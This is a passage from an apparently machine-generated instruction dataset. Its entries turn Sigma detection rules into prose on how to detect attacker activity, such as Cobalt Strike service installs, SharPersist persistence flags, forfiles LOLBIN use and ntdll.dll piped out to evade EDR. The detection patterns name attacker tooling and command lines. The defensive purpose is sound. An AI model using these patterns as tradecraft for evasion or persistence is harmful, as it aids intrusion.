    "output": "In order to detect a suspicious execution from an uncommon folder, you should monitor the creation of processes on Windows systems, focusing on executions that originate from certain directories that are unusual for standard software or system processes to execute from. Specifically, watch for processes starting from directories such as the Recycle Bin, system profiles, logs directories (Intel, RSA), user directories (including All Users, Default, NetworkService, Public), and several Windows internal directories (including addins, debug, Fonts, Help, IME, Media, repair, security, System32\\Tasks, and Tasks). Additionally, any process that starts with 'C:\\Perflogs\\' should be regarded as suspicious.\n\nHowever, to reduce false positives, ignore any detections that originate from the IBM Client Solutions start programs directory within the Public user's directory or from specific Citrix Updater Binaries locations, including the CitrixReceiverUpdater.exe executable.\n\nIn your monitoring, specifically look at the CommandLine and ParentCommandLine fields, if available, to gain further context around the suspicious execution. Given the high severity of detecting processes in these locations, it's crucial to maintain an up-to-date list of false positives, although currently, the potential for unknown false positives exists.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious execution from an uncommon folder",
      "answer": "In order to detect a suspicious execution from an uncommon folder, you should monitor the creation of processes on Windows systems, focusing on executions that originate from certain directories that are unusual for standard software or system processes to execute from. Specifically, watch for processes starting from directories such as the Recycle Bin, system profiles, logs directories (Intel, RSA), user directories (including All Users, Default, NetworkService, Public), and several Windows internal directories (including addins, debug, Fonts, Help, IME, Media, repair, security, System32\\Tasks, and Tasks). Additionally, any process that starts with 'C:\\Perflogs\\' should be regarded as suspicious.\n\nHowever, to reduce false positives, ignore any detections that originate from the IBM Client Solutions start programs directory within the Public user's directory or from specific Citrix Updater Binaries locations, including the CitrixReceiverUpdater.exe executable.\n\nIn your monitoring, specifically look at the CommandLine and ParentCommandLine fields, if available, to gain further context around the suspicious execution. Given the high severity of detecting processes in these locations, it's crucial to maintain an up-to-date list of false positives, although currently, the potential for unknown false positives exists."
    }
  },
  {
    "instruction": "How to detect: Azure Kubernetes network policy is modified or deleted.",
    "context": "",
    "output": "In order to identify when an Azure Kubernetes network policy is modified or deleted, you should: Monitor Azure Activity Logs for events related to the modification or deletion of network policies in Kubernetes environments. Look for operations with names such as `MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/NETWORKING.K8S.IO/NETWORKPOLICIES/WRITE` and `MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/NETWORKING.K8S.IO/NETWORKPOLICIES/DELETE` alongside their equivalents under the `EXTENSIONS` path. These operational names indicate that network policies, which are crucial for controlling the flow of traffic to and from containers in Kubernetes, are being created or altered, and their deletion, respectively. It's important to note that while some changes might be legitimate actions taken by system administrators, any modification or deletion from unfamiliar sources should be treated with suspicion and investigated accordingly. This activity relates to tactics and techniques such as Persistence, Privilege Escalation, and Defense Evasion by potentially allowing malicious actors unauthorized access or the ability to disrupt normal network communications within a Kubernetes cluster.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Azure Kubernetes network policy is modified or deleted.",
      "answer": "In order to identify when an Azure Kubernetes network policy is modified or deleted, you should: Monitor Azure Activity Logs for events related to the modification or deletion of network policies in Kubernetes environments. Look for operations with names such as `MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/NETWORKING.K8S.IO/NETWORKPOLICIES/WRITE` and `MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/NETWORKING.K8S.IO/NETWORKPOLICIES/DELETE` alongside their equivalents under the `EXTENSIONS` path. These operational names indicate that network policies, which are crucial for controlling the flow of traffic to and from containers in Kubernetes, are being created or altered, and their deletion, respectively. It's important to note that while some changes might be legitimate actions taken by system administrators, any modification or deletion from unfamiliar sources should be treated with suspicion and investigated accordingly. This activity relates to tactics and techniques such as Persistence, Privilege Escalation, and Defense Evasion by potentially allowing malicious actors unauthorized access or the ability to disrupt normal network communications within a Kubernetes cluster."
    }
  },
  {
    "instruction": "How can I detect: Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE privileges",
    "context": "",
    "output": "In order to detect child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE privileges, you should monitor Windows process creation events. Focus specifically on processes where the parent process runs under either the 'NT AUTHORITY\\NETWORK SERVICE' or 'NT AUTHORITY\\LOCAL SERVICE' accounts, and the child process runs under the 'NT AUTHORITY\\SYSTEM' account. However, it's important to exclude any instances where the child process is 'rundll32.exe' involving the command line containing 'DavSetCookie,' as these are known exceptions. This approach aims to identify potential malicious activities where higher privilege processes are initiated by lower privilege services, a technique often exploited by attackers to escalate privileges or maintain persistence. The detection relies on enriched Sysmon events with additional information about the processes, particularly in regard to parent and user accounts involved. Be aware that some legitimate activities might trigger this detection, so unknown false positives can occur. Enhance this monitoring strategy by using the recommended enrichments for Sysmon event ID 1, to provide a more comprehensive context around the creation of new processes on Windows systems. This detection mechanism is categorized under high severity due to the implications of a successful attack exploiting this behavior.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE privileges",
      "answer": "In order to detect child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE privileges, you should monitor Windows process creation events. Focus specifically on processes where the parent process runs under either the 'NT AUTHORITY\\NETWORK SERVICE' or 'NT AUTHORITY\\LOCAL SERVICE' accounts, and the child process runs under the 'NT AUTHORITY\\SYSTEM' account. However, it's important to exclude any instances where the child process is 'rundll32.exe' involving the command line containing 'DavSetCookie,' as these are known exceptions. This approach aims to identify potential malicious activities where higher privilege processes are initiated by lower privilege services, a technique often exploited by attackers to escalate privileges or maintain persistence. The detection relies on enriched Sysmon events with additional information about the processes, particularly in regard to parent and user accounts involved. Be aware that some legitimate activities might trigger this detection, so unknown false positives can occur. Enhance this monitoring strategy by using the recommended enrichments for Sysmon event ID 1, to provide a more comprehensive context around the creation of new processes on Windows systems. This detection mechanism is categorized under high severity due to the implications of a successful attack exploiting this behavior."
    }
  },
  {
    "instruction": "Explain how should I detect the following: user downloads file by using CertOC.exe",
    "context": "",
    "output": "In order to detect when a user downloads file by using CertOC.exe, you should: Monitor the creation of processes on Windows systems, with a particular focus on identifying instances where the process image name ends with '\\certoc.exe' or when the original file name is 'CertOC.exe'. Additionally, watch for command lines that contain '-GetCACAPS'. Both criteria need to be met for an alert to be considered accurate. This detection process is tagged under the MITRE ATT&CK tactics and techniques related to Execution. Be aware that there might be situations where legitimate activities trigger an alert, although such false positives are not currently known. The significance of detections based on these criteria is considered high, indicating a strong likelihood of malicious activity when such conditions are met.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "user downloads file by using CertOC.exe",
      "answer": "In order to detect when a user downloads file by using CertOC.exe, you should: Monitor the creation of processes on Windows systems, with a particular focus on identifying instances where the process image name ends with '\\certoc.exe' or when the original file name is 'CertOC.exe'. Additionally, watch for command lines that contain '-GetCACAPS'. Both criteria need to be met for an alert to be considered accurate. This detection process is tagged under the MITRE ATT&CK tactics and techniques related to Execution. Be aware that there might be situations where legitimate activities trigger an alert, although such false positives are not currently known. The significance of detections based on these criteria is considered high, indicating a strong likelihood of malicious activity when such conditions are met."
    }
  },
  {
    "instruction": "Please help me detect the following: javaw.exe in AppData folder as used by Adwind / JRAT",
    "context": "",
    "output": "Sure!\nIn order to detect javaw.exe in the AppData folder as used by Adwind / JRAT, you should: Monitor Windows file events for activities involving filenames that match specific patterns indicating potential malicious behavior. Specifically, look for files within the AppData\\Roaming\\Oracle\\bin\\java directory that have an '.exe' extension, as well as files that contain '\\Retrive' and '.vbs' in their names. These patterns are indicative of the presence of the Adwind or JRAT malware on the system, which leverage these paths and file types as part of their operation. This detection focuses on identifying suspicious file activities that align with tactics and techniques common to these types of malware, thus providing an alert to potentially compromised systems.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "javaw.exe in AppData folder as used by Adwind / JRAT",
      "answer": "In order to detect javaw.exe in the AppData folder as used by Adwind / JRAT, you should: Monitor Windows file events for activities involving filenames that match specific patterns indicating potential malicious behavior. Specifically, look for files within the AppData\\Roaming\\Oracle\\bin\\java directory that have an '.exe' extension, as well as files that contain '\\Retrive' and '.vbs' in their names. These patterns are indicative of the presence of the Adwind or JRAT malware on the system, which leverage these paths and file types as part of their operation. This detection focuses on identifying suspicious file activities that align with tactics and techniques common to these types of malware, thus providing an alert to potentially compromised systems."
    }
  },
  {
    "instruction": "Explain how should I detect the following: potential installation or installation attempts of known malicious appx packages",
    "context": "",
    "output": "In order to detect potential installation or installation attempts of known malicious appx packages, you should focus on monitoring the AppX Deployment Server service on Windows systems. Specifically, look for events with IDs 400 and 401, which are indicative of activities related to the deployment of application packages. Among these events, pay special attention to any instance where the PackageFullName attribute contains the string '3669e262-ec02-4e9d-bcb4-3d008b4afac9', as this is a known identifier for a malicious package. \n\nBe aware that there are rare cases where a malicious package might use the same name and version as a legitimate application, which could lead to false positives. Nonetheless, consistently monitoring for these specific event IDs and package names is crucial for identifying potential threats. This approach leverages tags associated with tactics and techniques such as Execution and Persistence, aligning with the behaviors typically expected from the deployment of malicious software through the misuse of Windows app deployment mechanisms.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential installation or installation attempts of known malicious appx packages",
      "answer": "In order to detect potential installation or installation attempts of known malicious appx packages, you should focus on monitoring the AppX Deployment Server service on Windows systems. Specifically, look for events with IDs 400 and 401, which are indicative of activities related to the deployment of application packages. Among these events, pay special attention to any instance where the PackageFullName attribute contains the string '3669e262-ec02-4e9d-bcb4-3d008b4afac9', as this is a known identifier for a malicious package. \n\nBe aware that there are rare cases where a malicious package might use the same name and version as a legitimate application, which could lead to false positives. Nonetheless, consistently monitoring for these specific event IDs and package names is crucial for identifying potential threats. This approach leverages tags associated with tactics and techniques such as Execution and Persistence, aligning with the behaviors typically expected from the deployment of malicious software through the misuse of Windows app deployment mechanisms."
    }
  },
  {
    "instruction": "Can you explain how to detect: Powerup tool's Write Hijack DLL exploits DLL hijacking for privilege escalation.\nIn it's default mode, it builds a self deleting .bat file which executes malicious command.\nThe detection rule relies on creation of the malicious bat file (debug.bat by default).\n",
    "context": "",
    "output": "Certainly!\n\nIn order to detect attempts to exploit DLL hijacking for privilege escalation through Powerup tool's Write Hijack DLL, which in its default mode constructs and executes a self-deleting .bat file to run malicious commands, you should focus on monitoring Windows file events, specifically looking for the creation of .bat files by PowerShell (powershell.exe or pwsh.exe). The emphasis is on identifying instances where these executables are responsible for generating .bat files, as this behavior is indicative of the described attack mechanism. Notably, while it\u2019s conceivable that legitimate PowerShell scripts could generate .bat files, such occurrences are expected to be extremely rare and thus potentially indicative of malicious activity warranting closer inspection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Powerup tool's Write Hijack DLL exploits DLL hijacking for privilege escalation.\nIn it's default mode, it builds a self deleting .bat file which executes malicious command.\nThe detection rule relies on creation of the malicious bat file (debug.bat by default).\n",
      "answer": "In order to detect attempts to exploit DLL hijacking for privilege escalation through Powerup tool's Write Hijack DLL, which in its default mode constructs and executes a self-deleting .bat file to run malicious commands, you should focus on monitoring Windows file events, specifically looking for the creation of .bat files by PowerShell (powershell.exe or pwsh.exe). The emphasis is on identifying instances where these executables are responsible for generating .bat files, as this behavior is indicative of the described attack mechanism. Notably, while it\u2019s conceivable that legitimate PowerShell scripts could generate .bat files, such occurrences are expected to be extremely rare and thus potentially indicative of malicious activity warranting closer inspection."
    }
  },
  {
    "instruction": "Explain how should I detect the following: suspicious parent of csc.exe, which could by a sign of payload delivery",
    "context": "",
    "output": "In order to detect a suspicious parent of csc.exe, which could be a sign of payload delivery, you should: Identify instances in Windows process creation logs where the executable 'csc.exe' is initiated by parent processes that are known for potentially dangerous script execution or HTML application hosting. Specifically, look for 'csc.exe' being launched following 'wscript.exe', 'cscript.exe', or 'mshta.exe'. The detection of these particular parent-child process relationships is crucial, as it may indicate an attempt to dynamically compile and execute code as part of a payload delivery mechanism, which is a common tactic in various cyber attacks. Recognize that such activities are flagged with a high level of concern, although there might be scenarios where these detections are innocuous, and those are currently categorized as unknown false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious parent of csc.exe, which could by a sign of payload delivery",
      "answer": "In order to detect a suspicious parent of csc.exe, which could be a sign of payload delivery, you should: Identify instances in Windows process creation logs where the executable 'csc.exe' is initiated by parent processes that are known for potentially dangerous script execution or HTML application hosting. Specifically, look for 'csc.exe' being launched following 'wscript.exe', 'cscript.exe', or 'mshta.exe'. The detection of these particular parent-child process relationships is crucial, as it may indicate an attempt to dynamically compile and execute code as part of a payload delivery mechanism, which is a common tactic in various cyber attacks. Recognize that such activities are flagged with a high level of concern, although there might be scenarios where these detections are innocuous, and those are currently categorized as unknown false positives."
    }
  },
  {
    "instruction": "How can I detect: execition of commands and binaries from the context of \"forfiles.exe\". This can be used as a LOLBIN in order to bypass application whitelisting.",
    "context": "",
    "output": "In order to detect execution of commands and binaries from the context of \"forfiles.exe\", which can be used as a LOLBIN (Living Off The Land Binaries) in order to bypass application whitelisting, you should: Monitor Windows process creation logs for instances where \"forfiles.exe\" is used as the parent image. Specifically, look for command lines that include switches such as '/c', '-c' (for executing commands), '/p', '-p' (which specify the path to operate on), and '/m', '-m' (used to match files). However, you must exclude detections where the process image ends with '\\cmd.exe' and the command line contains both 'xcopy' and 'cmd /c del', as these are considered common legitimate uses that could result in false positives. This approach is pertinent for identifying potentially malicious activity wherein attackers utilize built-in system tools to execute commands that may evade detection by security solutions relying on blacklists of known-bad executables.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execition of commands and binaries from the context of \"forfiles.exe\". This can be used as a LOLBIN in order to bypass application whitelisting.",
      "answer": "In order to detect execution of commands and binaries from the context of \"forfiles.exe\", which can be used as a LOLBIN (Living Off The Land Binaries) in order to bypass application whitelisting, you should: Monitor Windows process creation logs for instances where \"forfiles.exe\" is used as the parent image. Specifically, look for command lines that include switches such as '/c', '-c' (for executing commands), '/p', '-p' (which specify the path to operate on), and '/m', '-m' (used to match files). However, you must exclude detections where the process image ends with '\\cmd.exe' and the command line contains both 'xcopy' and 'cmd /c del', as these are considered common legitimate uses that could result in false positives. This approach is pertinent for identifying potentially malicious activity wherein attackers utilize built-in system tools to execute commands that may evade detection by security solutions relying on blacklists of known-bad executables."
    }
  },
  {
    "instruction": "Can you explain how to detect: known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement.\nWe can also catch this by system log 7045 (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_cobaltstrike_service_installs.yml)\nIn some SIEM you can catch those events also in HKLM\\System\\ControlSet001\\Services or HKLM\\System\\ControlSet002\\Services, however, this rule is based on a regular sysmon's events.\n",
    "context": "",
    "output": "Certainly!\n\nIn order to detect known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement, you should focus on monitoring the Windows registry settings, specifically within the system's registry key modifications. Look for events where a value is being set (EventType: SetValue) in registry paths that include 'HKLM\\System\\CurrentControlSet\\Services'. This indicates a service installation or modification, which could be malicious if associated with known patterns.\n\nYou should pay particular attention to two specific sets of conditions that can signal a malicious service install. One set involves any registry modifications that contain both the 'ADMIN$' share and an executable file ('.exe'). This can indicate an attempt to install or modify a service for remote administration or execution of malicious code. The second set of conditions to watch for includes modifications that contain the command processor environment variable ('%COMSPEC%'), the 'start' command, and 'powershell'. This combination suggests an attempt to leverage PowerShell from a command script for potentially malicious purposes, such as executing scripts or commands that install services associated with a Cobalt Strike beacon.\n\nWhile monitoring these activities, be aware that not all modifications fitting these patterns are definitively malicious, and unknown false positives can occur. However, given the critical level of this behavior, any detection warrants immediate investigation. This monitoring is based on observing registry settings changes in Windows environments, aimed specifically at catching malicious service installations related to Cobalt Strike beacon activities, which are known for their capabilities in elevating privileges and facilitating lateral movement within compromised networks. These activities are usually logged under event 7045 in system logs, but can also be detected through specific registry key modifications as described.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement.\nWe can also catch this by system log 7045 (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_cobaltstrike_service_installs.yml)\nIn some SIEM you can catch those events also in HKLM\\System\\ControlSet001\\Services or HKLM\\System\\ControlSet002\\Services, however, this rule is based on a regular sysmon's events.\n",
      "answer": "In order to detect known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement, you should focus on monitoring the Windows registry settings, specifically within the system's registry key modifications. Look for events where a value is being set (EventType: SetValue) in registry paths that include 'HKLM\\System\\CurrentControlSet\\Services'. This indicates a service installation or modification, which could be malicious if associated with known patterns.\n\nYou should pay particular attention to two specific sets of conditions that can signal a malicious service install. One set involves any registry modifications that contain both the 'ADMIN$' share and an executable file ('.exe'). This can indicate an attempt to install or modify a service for remote administration or execution of malicious code. The second set of conditions to watch for includes modifications that contain the command processor environment variable ('%COMSPEC%'), the 'start' command, and 'powershell'. This combination suggests an attempt to leverage PowerShell from a command script for potentially malicious purposes, such as executing scripts or commands that install services associated with a Cobalt Strike beacon.\n\nWhile monitoring these activities, be aware that not all modifications fitting these patterns are definitively malicious, and unknown false positives can occur. However, given the critical level of this behavior, any detection warrants immediate investigation. This monitoring is based on observing registry settings changes in Windows environments, aimed specifically at catching malicious service installations related to Cobalt Strike beacon activities, which are known for their capabilities in elevating privileges and facilitating lateral movement within compromised networks. These activities are usually logged under event 7045 in system logs, but can also be detected through specific registry key modifications as described."
    }
  },
  {
    "instruction": "Can you explain how to detect: when the password policy is enumerated.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect when the password policy is enumerated, you should: monitor security logs from Windows operating systems. Specifically, look out for event ID 4661, which indicates that a handle to an object was requested. This event becomes noteworthy when the AccessList contains '%%5392', signifying the ReadPasswordParameters access was requested. Additionally, the ObjectServer should be 'Security Account Manager'. Such activities could suggest an attempt to enumerate the password policy, which is often an early step in broader attack strategies aimed at compromising system security. The detection of this behavior is classified at a medium level of concern due to its potential to escalate into more severe actions if not addressed. Tags indicating the related attack tactics and techniques include Credential Access and Discovery.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when the password policy is enumerated.",
      "answer": "In order to detect when the password policy is enumerated, you should: monitor security logs from Windows operating systems. Specifically, look out for event ID 4661, which indicates that a handle to an object was requested. This event becomes noteworthy when the AccessList contains '%%5392', signifying the ReadPasswordParameters access was requested. Additionally, the ObjectServer should be 'Security Account Manager'. Such activities could suggest an attempt to enumerate the password policy, which is often an early step in broader attack strategies aimed at compromising system security. The detection of this behavior is classified at a medium level of concern due to its potential to escalate into more severe actions if not addressed. Tags indicating the related attack tactics and techniques include Credential Access and Discovery."
    }
  },
  {
    "instruction": "Explain how should I detect the following: extraction of password protected ZIP archives. See the filename variable for more details on which file has been opened.",
    "context": "",
    "output": "In order to detect the extraction of password protected ZIP archives, you should: Monitor Windows security logs for event ID 5379, which is triggered when a password-protected ZIP archive is opened. Specifically, look for instances where the 'TargetName' field contains both 'Microsoft_Windows_Shell_ZipFolder:filename' and a path including '\\Temporary Internet Files\\Content.Outlook'. This indicates that a ZIP file, possibly containing sensitive information, has been accessed after being received through Outlook and saved in temporary internet files, a scenario that can be indicative of suspicious behavior. However, it's important to remember that there could be legitimate use cases for accessing encrypted ZIP files in this manner, which should be considered to avoid false positives. For cybersecurity professionals, understanding this behavior is crucial for identifying potential exfiltration or malware deployment activities, tagged under tactics such as Credential Access, Defense Evasion, and Exfiltration.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "extraction of password protected ZIP archives. See the filename variable for more details on which file has been opened.",
      "answer": "In order to detect the extraction of password protected ZIP archives, you should: Monitor Windows security logs for event ID 5379, which is triggered when a password-protected ZIP archive is opened. Specifically, look for instances where the 'TargetName' field contains both 'Microsoft_Windows_Shell_ZipFolder:filename' and a path including '\\Temporary Internet Files\\Content.Outlook'. This indicates that a ZIP file, possibly containing sensitive information, has been accessed after being received through Outlook and saved in temporary internet files, a scenario that can be indicative of suspicious behavior. However, it's important to remember that there could be legitimate use cases for accessing encrypted ZIP files in this manner, which should be considered to avoid false positives. For cybersecurity professionals, understanding this behavior is crucial for identifying potential exfiltration or malware deployment activities, tagged under tactics such as Credential Access, Defense Evasion, and Exfiltration."
    }
  },
  {
    "instruction": "Please help me detect the following: execution of PktMon, a tool that captures network packets.",
    "context": "",
    "output": "Sure!\nIn order to detect execution of PktMon, a tool that captures network packets, you should: Monitor for the creation of processes on Windows that involve the execution of 'pktmon.exe'. Specifically, check if any process executed ends with the file name '\\pktmon.exe' or if the OriginalFileName attribute is exactly 'PktMon.exe'. Be mindful, however, that there may be legitimate uses of this tool, thus it's classified with a medium level of alert. This detection focuses on identifying potential surveillance or network packet capture activities which might be an indication of malicious behavior.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of PktMon, a tool that captures network packets.",
      "answer": "In order to detect execution of PktMon, a tool that captures network packets, you should: Monitor for the creation of processes on Windows that involve the execution of 'pktmon.exe'. Specifically, check if any process executed ends with the file name '\\pktmon.exe' or if the OriginalFileName attribute is exactly 'PktMon.exe'. Be mindful, however, that there may be legitimate uses of this tool, thus it's classified with a medium level of alert. This detection focuses on identifying potential surveillance or network packet capture activities which might be an indication of malicious behavior."
    }
  },
  {
    "instruction": "How to detect: execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms",
    "context": "",
    "output": "In order to detect the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms, you should: \n\nMonitor Windows process creation logs for any activity related to SharPersist.exe. Specifically, look for the process name ending with '\\SharPersist.exe' or instances where the product name is identified as 'SharPersist'. Additionally, pay close attention to the command line arguments associated with these processes. Detection can be achieved by identifying specific patterns in the command line that indicate attempts to establish persistence on the system through various methods. \n\nThere are several command line patterns to be aware of:\n- Commands that include ' -t schtask -c ' or ' -t startupfolder -c ', which suggest attempts to create scheduled tasks or add items to the startup folder for persistence.\n- Commands containing both ' -t reg -c ' and ' -m add', indicating attempts to add registry keys for persistence.\n- Similarly, identifying command line patterns with both ' -t service -c ' and ' -m add' points towards attempts to add new services for persistence.\n- Lastly, be vigilant for commands that contain both ' -t schtask -c ' and ' -m add', signaling an attempt to add scheduled tasks.\n\nIt's important to consider any command fitting these patterns as a potential indicator of malicious activity associated with persistence attempts using SharPersist. However, be mindful of false positives, as they can occur, although unspecified. Given the severity of these actions, any detected activity should be considered high-risk and warrant immediate investigation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms",
      "answer": "In order to detect the execution of the hacktool SharPersist - used to deploy various different kinds of persistence mechanisms, you should: \n\nMonitor Windows process creation logs for any activity related to SharPersist.exe. Specifically, look for the process name ending with '\\SharPersist.exe' or instances where the product name is identified as 'SharPersist'. Additionally, pay close attention to the command line arguments associated with these processes. Detection can be achieved by identifying specific patterns in the command line that indicate attempts to establish persistence on the system through various methods. \n\nThere are several command line patterns to be aware of:\n- Commands that include ' -t schtask -c ' or ' -t startupfolder -c ', which suggest attempts to create scheduled tasks or add items to the startup folder for persistence.\n- Commands containing both ' -t reg -c ' and ' -m add', indicating attempts to add registry keys for persistence.\n- Similarly, identifying command line patterns with both ' -t service -c ' and ' -m add' points towards attempts to add new services for persistence.\n- Lastly, be vigilant for commands that contain both ' -t schtask -c ' and ' -m add', signaling an attempt to add scheduled tasks.\n\nIt's important to consider any command fitting these patterns as a potential indicator of malicious activity associated with persistence attempts using SharPersist. However, be mindful of false positives, as they can occur, although unspecified. Given the severity of these actions, any detected activity should be considered high-risk and warrant immediate investigation."
    }
  },
  {
    "instruction": "Explain how should I detect the following: attempts to discover the files with setuid/setgid capability on them. That would allow adversary to escalate their privileges.",
    "context": "",
    "output": "In order to detect attempts to discover the files with setuid/setgid capability on them, that would allow an adversary to escalate their privileges, you should monitor the auditd logs on Linux systems for specific execution events. Look for the use of the `getcap` command with the `-r` (recursive) option targeting the root directory symbolized as `/`. This behavior indicates a scanning activity to find files with setuid or setgid permissions, which are a common target for attackers seeking to elevate their privileges within a system. Such an attempt is characterized by the `EXECVE` type in the audit logs, where the `a0`, `a1`, and `a2` arguments correspond to the `getcap` command, the `-r` option, and the `'/'` directory respectively. While this detection is of low level of certainty and might have unknown false positives, it is crucial for identifying potential privilege escalation efforts.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "attempts to discover the files with setuid/setgid capability on them. That would allow adversary to escalate their privileges.",
      "answer": "In order to detect attempts to discover the files with setuid/setgid capability on them, that would allow an adversary to escalate their privileges, you should monitor the auditd logs on Linux systems for specific execution events. Look for the use of the `getcap` command with the `-r` (recursive) option targeting the root directory symbolized as `/`. This behavior indicates a scanning activity to find files with setuid or setgid permissions, which are a common target for attackers seeking to elevate their privileges within a system. Such an attempt is characterized by the `EXECVE` type in the audit logs, where the `a0`, `a1`, and `a2` arguments correspond to the `getcap` command, the `-r` option, and the `'/'` directory respectively. While this detection is of low level of certainty and might have unknown false positives, it is crucial for identifying potential privilege escalation efforts."
    }
  },
  {
    "instruction": "How can I detect: Detect attempt to enable auditing of TTY input",
    "context": "",
    "output": "In order to detect attempt to enable auditing of TTY input, you should: Monitor for specific events within Linux environments where the audit daemon (auditd) is enabled. Focus on detecting when there are modifications or interactions with critical authentication-related files, specifically '/etc/pam.d/system-auth' and '/etc/pam.d/password-auth'. Additionally, pay attention to events related to TTY (Teletypewriter) inputs, such as those classified as 'TTY' and 'USER_TTY'. These events should be carefully reviewed to determine if they represent legitimate administrative activities or if they are indicative of an attacker attempting to enable auditing on TTY inputs to capture user inputs, potentially including credentials. Administrative actions could sometimes trigger these events, so it's essential to differentiate between normal administrative work and potential security threats. The detection is considered high level due to the sensitive nature of the activity and its potential impact on security.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect attempt to enable auditing of TTY input",
      "answer": "In order to detect attempt to enable auditing of TTY input, you should: Monitor for specific events within Linux environments where the audit daemon (auditd) is enabled. Focus on detecting when there are modifications or interactions with critical authentication-related files, specifically '/etc/pam.d/system-auth' and '/etc/pam.d/password-auth'. Additionally, pay attention to events related to TTY (Teletypewriter) inputs, such as those classified as 'TTY' and 'USER_TTY'. These events should be carefully reviewed to determine if they represent legitimate administrative activities or if they are indicative of an attacker attempting to enable auditing on TTY inputs to capture user inputs, potentially including credentials. Administrative actions could sometimes trigger these events, so it's essential to differentiate between normal administrative work and potential security threats. The detection is considered high level due to the sensitive nature of the activity and its potential impact on security."
    }
  },
  {
    "instruction": "How to detect: command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection. As seen being used in the POC NtdllPipe",
    "context": "",
    "output": "In order to detect commands that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection, as seen being used in the POC NtdllPipe, you should: keep an eye on processes launched in Windows that involve specific command line actions. These actions include utilizing the 'type' command against the 'ntdll.dll' file located in the system32 directory, using either environment variables (%windir% or %systemroot%) or a hardcoded path (c:\\windows\\system32\\ntdll.dll). Also, watch for operations that redirect ('>') the content of 'ntdll.dll' to a pipe ('\\\\\\\\.\\\\pipe\\\\'). This kind of activity could indicate an attempt to bypass antivirus or Endpoint Detection and Response (EDR) mechanisms by manipulating or inspecting the 'ntdll.dll', a critical system library file. Such actions are considered highly suspicious and warrant investigation as they could be part of a broader attack strategy to evade detection tools.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection. As seen being used in the POC NtdllPipe",
      "answer": "In order to detect commands that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection, as seen being used in the POC NtdllPipe, you should: keep an eye on processes launched in Windows that involve specific command line actions. These actions include utilizing the 'type' command against the 'ntdll.dll' file located in the system32 directory, using either environment variables (%windir% or %systemroot%) or a hardcoded path (c:\\windows\\system32\\ntdll.dll). Also, watch for operations that redirect ('>') the content of 'ntdll.dll' to a pipe ('\\\\\\\\.\\\\pipe\\\\'). This kind of activity could indicate an attempt to bypass antivirus or Endpoint Detection and Response (EDR) mechanisms by manipulating or inspecting the 'ntdll.dll', a critical system library file. Such actions are considered highly suspicious and warrant investigation as they could be part of a broader attack strategy to evade detection tools."
    }
  },
  {
    "instruction": "Can you explain how to detect: potential PwnKit exploitation CVE-2021-4034 in auth logs",
    "context": "",
    "output": "Certainly!\n\nIn order to detect potential PwnKit exploitation CVE-2021-4034 in auth logs, you should: Focus on authentication log files generated by Linux systems. Specifically, look for any of the following suspicious activities: usage of the 'pkexec' command, indications that the environment variable XAUTHORITY contains suspicious content, or logs containing both '[USER=root]' and '[TTY=/dev/pts/0]'. The detection of any of these activities may signify potential exploitation of the vulnerability. The tags related to this type of attack include Persistence, Privilege Escalation, and Defense Evasion techniques. It's important to note that while this method aims for precise identification of malicious behavior, some legitimate actions might occasionally trigger these indicators, though such false positives are currently unknown. This approach is tagged as high level due to the severity implication of successful exploitation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential PwnKit exploitation CVE-2021-4034 in auth logs",
